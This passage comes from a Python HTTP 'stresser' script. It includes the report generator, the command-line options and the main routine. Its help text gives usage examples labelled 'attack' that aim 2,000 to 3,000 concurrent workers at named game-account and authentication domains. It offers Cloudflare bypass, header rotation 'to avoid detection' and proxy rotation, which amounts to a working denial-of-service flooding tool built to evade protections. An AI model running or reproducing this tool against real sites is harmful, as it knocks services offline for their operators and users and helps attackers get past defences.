                    await asyncio.sleep(0.05)
                
                self.running = False
                self.dashboard.running = False
                live.update(self.dashboard.render())
                await asyncio.sleep(0.5)
                
        except KeyboardInterrupt:
            self.console.print("\n[yellow]⚠️ Stopped by user[/yellow]")
            self.running = False
        
        finally:
            self.running = False
            self.stats.end_time = time.time()
            
            # Cancel workers
            for worker in self.workers:
                worker.cancel()
            await asyncio.gather(*self.workers, return_exceptions=True)
            
            if self.session:
                await self.session.close()
            
            self.dashboard.running = False
        
        return self.stats
    
    async def _worker_loop(self, worker: AccurateWorker):
        """Worker loop"""
        while self.running and time.time() - self.stats.start_time < self.duration:
            result = await worker.make_request()
            self.stats.add_result(result)

# ============================================
# REPORT GENERATOR
# ============================================

class ReportGenerator:
    """Generate reports from stress test results"""
    
    @staticmethod
    def generate_text_report(stats: GlobalStats, config: Dict[str, Any]) -> str:
        """Generate text report"""
        lines = []
        lines.append("=" * 80)
        lines.append(f"STRESS TEST REPORT - V{VERSION}")
        lines.append("=" * 80)
        lines.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append("")
        lines.append("CONFIGURATION:")
        for key, value in config.items():
            lines.append(f"  {key}: {value}")
        lines.append("")
        lines.append("GLOBAL STATISTICS:")
        lines.append(f"  Total Requests: {stats.total_requests:,}")
        lines.append(f"  Successful: {stats.successful:,} ({stats.success_rate:.1f}%)")
        lines.append(f"  Failed: {stats.failed:,} ({stats.error_rate:.1f}%)")
        lines.append(f"  Cloudflare Blocked: {stats.cloudflare_blocked:,} ({stats.cloudflare_rate:.1f}%)")
        lines.append(f"    - Challenges: {stats.cloudflare_challenge:,}")
        lines.append(f"    - CAPTCHA: {stats.cloudflare_captcha:,}")
        lines.append(f"    - Rate Limited: {stats.cloudflare_rate_limited:,}")
        lines.append(f"  Timeouts: {stats.timeouts:,}")
        lines.append(f"  Connection Errors: {stats.connection_errors:,}")
        lines.append(f"  RPS: {stats.rps:.2f}")
        lines.append(f"  Elapsed: {stats.elapsed:.1f}s")
        lines.append("")
        lines.append("LATENCY METRICS:")
        if stats.latencies:
            lines.append(f"  P50: {stats.get_percentile(50):.4f}s")
            lines.append(f"  P75: {stats.get_percentile(75):.4f}s")
            lines.append(f"  P90: {stats.get_percentile(90):.4f}s")
            lines.append(f"  P95: {stats.get_percentile(95):.4f}s")
            lines.append(f"  P99: {stats.get_percentile(99):.4f}s")
            lines.append(f"  AVG: {sum(stats.latencies) / len(stats.latencies):.4f}s")
            lines.append(f"  MIN: {min(stats.latencies):.4f}s")
            lines.append(f"  MAX: {max(stats.latencies):.4f}s")
        else:
            lines.append("  No latency data available")
        lines.append("")
        lines.append("STATUS CODE DISTRIBUTION:")
        for code, count in sorted(stats.status_codes.items()):
            label = "TIMEOUT" if code == 0 else str(code)
            pct = (count / stats.total_requests * 100) if stats.total_requests > 0 else 0
            lines.append(f"  {label}: {count:,} ({pct:.1f}%)")
        lines.append("")
        
        if stats.target_stats:
            lines.append("PER-TARGET STATISTICS:")
            for url, target_stats in stats.target_stats.items():
                lines.append(f"\n  Target: {url}")
                lines.append(f"    Requests: {target_stats.total_requests:,}")
                lines.append(f"    Success Rate: {target_stats.success_rate:.1f}%")
                lines.append(f"    Cloudflare Blocked: {target_stats.cloudflare_blocked:,} ({target_stats.cloudflare_rate:.1f}%)")
                lines.append(f"    P95: {target_stats.get_percentile(95):.4f}s")
                lines.append(f"    RPS: {target_stats.total_requests / stats.elapsed:.2f}")
                if target_stats.status_codes:
                    lines.append("    Status Codes:")
                    for code, count in sorted(target_stats.status_codes.items()):
                        label = "TIMEOUT" if code == 0 else str(code)
                        lines.append(f"      {label}: {count:,}")
        
        lines.append("")
        lines.append("=" * 80)
        lines.append("END OF REPORT")
        lines.append("=" * 80)
        
        return "\n".join(lines)
    
    @staticmethod
    async def save_json(stats: GlobalStats, config: Dict[str, Any], filename: str = "stress_report.json"):
        """Save report as JSON"""
        data = {
            "version": VERSION,
            "timestamp": datetime.now().isoformat(),
            "config": config,
            "global": {
                "total_requests": stats.total_requests,
                "successful": stats.successful,
                "failed": stats.failed,
                "cloudflare_blocked": stats.cloudflare_blocked,
                "cloudflare_challenge": stats.cloudflare_challenge,
                "cloudflare_captcha": stats.cloudflare_captcha,
                "cloudflare_rate_limited": stats.cloudflare_rate_limited,
                "timeouts": stats.timeouts,
                "connection_errors": stats.connection_errors,
                "success_rate": stats.success_rate,
                "error_rate": stats.error_rate,
                "cloudflare_rate": stats.cloudflare_rate,
                "rps": stats.rps,
                "elapsed": stats.elapsed,
                "latencies": {
                    "p50": stats.get_percentile(50),
                    "p75": stats.get_percentile(75),
                    "p90": stats.get_percentile(90),
                    "p95": stats.get_percentile(95),
                    "p99": stats.get_percentile(99),
                    "avg": sum(stats.latencies) / len(stats.latencies) if stats.latencies else 0,
                    "min": min(stats.latencies) if stats.latencies else 0,
                    "max": max(stats.latencies) if stats.latencies else 0,
                },
                "status_codes": dict(stats.status_codes),
                "unique_cf_rays": len(set(stats.cf_rays))
            },
            "targets": {}
        }
        
        for url, target_stats in stats.target_stats.items():
            data["targets"][url] = {
                "total_requests": target_stats.total_requests,
                "successful": target_stats.successful,
                "failed": target_stats.failed,
                "cloudflare_blocked": target_stats.cloudflare_blocked,
                "cloudflare_challenge": target_stats.cloudflare_challenge,
                "cloudflare_captcha": target_stats.cloudflare_captcha,
                "cloudflare_rate_limited": target_stats.cloudflare_rate_limited,
                "timeouts": target_stats.timeouts,
                "connection_errors": target_stats.connection_errors,
                "success_rate": target_stats.success_rate,
                "error_rate": target_stats.error_rate,
                "cloudflare_rate": target_stats.cloudflare_rate,
                "rps": target_stats.total_requests / stats.elapsed if stats.elapsed > 0 else 0,
                "latencies": {
                    "p50": target_stats.get_percentile(50),
                    "p75": target_stats.get_percentile(75),
                    "p90": target_stats.get_percentile(90),
                    "p95": target_stats.get_percentile(95),
                    "p99": target_stats.get_percentile(99),
                    "avg": target_stats.avg_latency,
                    "min": target_stats.min_latency,
                    "max": target_stats.max_latency,
                },
                "status_codes": dict(target_stats.status_codes)
            }
        
        async with aiofiles.open(filename, "w", encoding="utf-8") as f:
            await f.write(json.dumps(data, indent=2))
    
    @staticmethod
    async def save_csv(stats: GlobalStats, filename: str = "stress_report.csv"):
        """Save report as CSV"""
        async with aiofiles.open(filename, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            
            # Write header
            writer.writerow([
                "timestamp", "url", "status", "latency", "success",
                "cloudflare_blocked", "cloudflare_status", "cf_ray", "error"
            ])
            
            # Write data (we need to reconstruct results)
            # Note: This is simplified - actual implementation would need to store all results
            writer.writerow([
                datetime.now().isoformat(),
                "summary",
                stats.total_requests,
                stats.success_rate,
                stats.cloudflare_rate,
                "",
                "",
                "",
                ""
            ])

# ============================================
# COMMAND LINE INTERFACE
# ============================================

def parse_args() -> argparse.Namespace:
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="Accurate HTTP Stresser with Cloudflare Detection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic attack on single target
  python3 stresser.py --target https://account.mythgames.net/ --concurrency 3000 --duration 60
  
  # Multi-target attack
  python3 stresser.py --targets https://account.mythgames.net/ https://auth.mythgames.net/ --concurrency 2000 --duration 30
  
  # With proxies
  python3 stresser.py --target https://account.mythgames.net/ --concurrency 3000 --duration 60 --proxies "proxy1:8080,proxy2:8080"
  
  # Save report
  python3 stresser.py --target https://account.mythgames.net/ --concurrency 3000 --duration 60 --save-report --save-json
  
  # With Cloudflare bypass
  python3 stresser.py --target https://account.mythgames.net/ --concurrency 3000 --duration 60 --bypass-cloudflare --rotate-headers
        """
    )
    
    # Target options
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument(
        "--target",
        help="Single target URL"
    )
    target_group.add_argument(
        "--targets",
        nargs="+",
        help="Multiple target URLs"
    )
    
    # Performance options
    parser.add_argument(
        "--concurrency",
        type=int,
        default=DEFAULT_CONCURRENCY,
        help=f"Concurrent workers per target (default: {DEFAULT_CONCURRENCY})"
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=DEFAULT_DURATION,
        help=f"Duration in seconds (default: {DEFAULT_DURATION})"
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=DEFAULT_TIMEOUT,
        help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT})"
    )
    parser.add_argument(
        "--retries",
        type=int,
        default=DEFAULT_RETRIES,
        help=f"Number of retries (default: {DEFAULT_RETRIES})"
    )
    parser.add_argument(
        "--warmup",
        type=int,
        default=DEFAULT_WARMUP,
        help=f"Warmup duration in seconds (default: {DEFAULT_WARMUP})"
    )
    
    # Bypass options
    parser.add_argument(
        "--bypass-cloudflare",
        action="store_true",
        help="Enable Cloudflare bypass strategies"
    )
    parser.add_argument(
        "--rotate-headers",
        action="store_true",
        help="Rotate headers to avoid detection"
    )
    parser.add_argument(
        "--proxies",
        help="Comma-separated list of proxies (format: http://ip:port)"
    )
    parser.add_argument(
        "--proxy-rotation",
        type=int,
        default=DEFAULT_PROXY_ROTATION,
        help=f"Rotate proxy every N requests (default: {DEFAULT_PROXY_ROTATION})"
    )
    
    # Output options
    parser.add_argument(
        "--save-report",
        action="store_true",
        help="Save text report to file"
    )
    parser.add_argument(
        "--save-json",
        action="store_true",
        help="Save JSON report to file"
    )
    parser.add_argument(
        "--save-csv",
        action="store_true",
        help="Save CSV report to file"
    )
    parser.add_argument(
        "--report-file",
        default="stress_report.txt",
        help="Report filename (default: stress_report.txt)"
    )
    parser.add_argument(
        "--json-file",
        default="stress_report.json",
        help="JSON filename (default: stress_report.json)"
    )
    parser.add_argument(
        "--csv-file",
        default="stress_report.csv",
        help="CSV filename (default: stress_report.csv)"
    )
    
    # Display options
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable verbose logging"
    )
    parser.add_argument(
        "--quiet",
        action="store_true",
        help="Suppress all output except errors"
    )
    parser.add_argument(
        "--no-dashboard",
        action="store_true",
        help="Disable live dashboard"
    )
    
    return parser.parse_args()

# ============================================
# MAIN EXECUTION
# ============================================

async def main_async(args: argparse.Namespace) -> None:
    """Main async entry point"""
    console = Console()
    
    # Configure logging
    log_level = logging.DEBUG if args.verbose else logging.WARNING
    if args.quiet:
        log_level = logging.ERROR
    
    logging.basicConfig(
        level=log_level,
        format="%(asctime)s %(levelname)s %(message)s",
    )
    
    # Parse targets
    if args.target:
        targets = [args.target]
    else:
        targets = args.targets
    
    # Validate targets
    valid_targets = []
    for t in targets:
        t = t.strip()
        if t:
            if not t.startswith(("http://", "https://")):
                t = "https://" + t
            valid_targets.append(t)
    
    if not valid_targets:
        console.print("[red]❌ No valid targets specified![/red]")
        return
    
    # Parse proxies
    proxy_list = []
    if args.proxies:
        proxy_list = [p.strip() for p in args.proxies.split(",") if p.strip()]
    
    # Show banner
    console.print(Panel.fit(
        f"[bold red]⚡ ACCURATE STRESSER V{VERSION}[/bold red]\n"
        f"[white]Targets: {len(valid_targets)}[/white]\n"
        f"[white]Concurrency: {args.concurrency:,} per target[/white]\n"
        f"[white]Duration: {args.duration}s | Timeout: {args.timeout}s[/white]\n"
        f"[white]Retries: {args.retries} | Proxies: {len(proxy_list)}[/white]\n"
        f"[white]Cloudflare Bypass: {'✅' if args.bypass_cloudflare else '❌'}[/white]\n"
        f"[white]Header Rotation: {'✅' if args.rotate_headers else '❌'}[/white]\n"
        f"[bold green]✅ Accurate Cloudflare Detection ENABLED[/bold green]",
        border_style="red"
    ))
    
    # Show targets
    target_table = Table(title="🎯 Targets", box=box.ROUNDED)
    target_table.add_column("#", style="cyan")
    target_table.add_column("URL", style="white")
    target_table.add_column("Protocol", style="white")
    
    for i, target in enumerate(valid_targets, 1):
        protocol = "https" if target.startswith("https://") else "http"
        color = "green" if protocol == "https" else "yellow"
        target_table.add_row(str(i), target, f"[{color}]{protocol}[/{color}]")
    
    console.print(target_table)
    
    if proxy_list:
        console.print(f"[green]✅ Using {len(proxy_list)} proxies for rotation[/green]")
    else:
        console.print("[yellow]⚠️ No proxies provided - using direct connection[/yellow]")
    
    console.print("\n[yellow]⚠️ Starting stress test with accurate detection... Press Ctrl+C to stop[/yellow]\n")
    
    # Create engine
    engine = AccurateStressEngine(
        targets=valid_targets,
        concurrency=args.concurrency,
        duration=args.duration,
        timeout=args.timeout,
        retries=args.retries,
        proxies=proxy_list,
        rotate_headers=args.rotate_headers or args.bypass_cloudflare,
        use_proxy=bool(proxy_list)
    )
    
    # Handle Ctrl+C
    def signal_handler(sig, frame):
        console.print("\n[yellow]⚠️ Stopping stress test...[/yellow]")
        engine.running = False
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        # Run stress test
        stats = await engine.start()
        
        # Show completion
        console.print("\n[bold green]✅ STRESS TEST COMPLETE![/bold green]")
        
        # Save reports
        if args.save_report:
            config = {
                "targets": valid_targets,
                "concurrency": args.concurrency,
                "duration": args.duration,
                "timeout": args.timeout,
                "retries": args.retries,
                "proxies": len(proxy_list),
                "bypass_cloudflare": args.bypass_cloudflare,
                "rotate_headers": args.rotate_headers,
            }
            report = ReportGenerator.generate_text_report(stats, config)
            with open(args.report_file, "w", encoding="utf-8") as f:
                f.write(report)
            console.print(f"[green]✅ Text report saved to {args.report_file}[/green]")
        
        if args.save_json:
            config = {
                "targets": valid_targets,
                "concurrency": args.concurrency,
                "duration": args.duration,
                "timeout": args.timeout,
                "retries": args.retries,
                "proxies": len(proxy_list),
                "bypass_cloudflare": args.bypass_cloudflare,
                "rotate_headers": args.rotate_headers,
            }
            await ReportGenerator.save_json(stats, config, args.json_file)
            console.print(f"[green]✅ JSON report saved to {args.json_file}[/green]")
        
        if args.save_csv:
            await ReportGenerator.save_csv(stats, args.csv_file)
            console.print(f"[green]✅ CSV report saved to {args.csv_file}[/green]")
        
        # Show summary
        console.print("\n[bold]📊 SUMMARY:[/bold]")
        console.print(f"  Total Requests: {stats.total_requests:,}")
        console.print(f"  Success Rate: {stats.success_rate:.1f}%")
        console.print(f"  Cloudflare Blocked: {stats.cloudflare_blocked:,} ({stats.cloudflare_rate:.1f}%)")
        console.print(f"  RPS: {stats.rps:.2f}")
        console.print(f"  P95: {stats.get_percentile(95):.4f}s")
        
        # Show detailed report
        console.print("\n[bold]📋 DETAILED REPORT:[/bold]")
        console.print(f"  ✅ Successful: {stats.successful:,}")
        console.print(f"  ❌ Failed: {stats.failed:,}")
        console.print(f"  ⏱️ Timeouts: {stats.timeouts:,}")
        console.print(f"  🧩 CF Challenges: {stats.cloudflare_challenge:,}")
        console.print(f"  🔒 CF CAPTCHA: {stats.cloudflare_captcha:,}")
        console.print(f"  🚫 CF Rate Limit: {stats.cloudflare_rate_limited:,}")
        
        if stats.cf_rays:
            unique_rays = len(set(stats.cf_rays))
            console.print(f"  📡 Unique CF Ray IDs: {unique_rays:,}")
        
    except Exception as e:
        console.print(f"\n[bold red]❌ Error: {e}[/bold red]")
        if args.verbose:
            import traceback
            traceback.print_exc()

def main() -> None:
    """Main entry point"""
    args = parse_args()
    
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        console = Console()
        console.print("\n\n[yellow]⚠️ Stopped by user.[/yellow]")
        sys.exit(0)
    except Exception as e:
        console = Console()
        console.print(f"\n[bold red]❌ Fatal Error: {e}[/bold red]")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()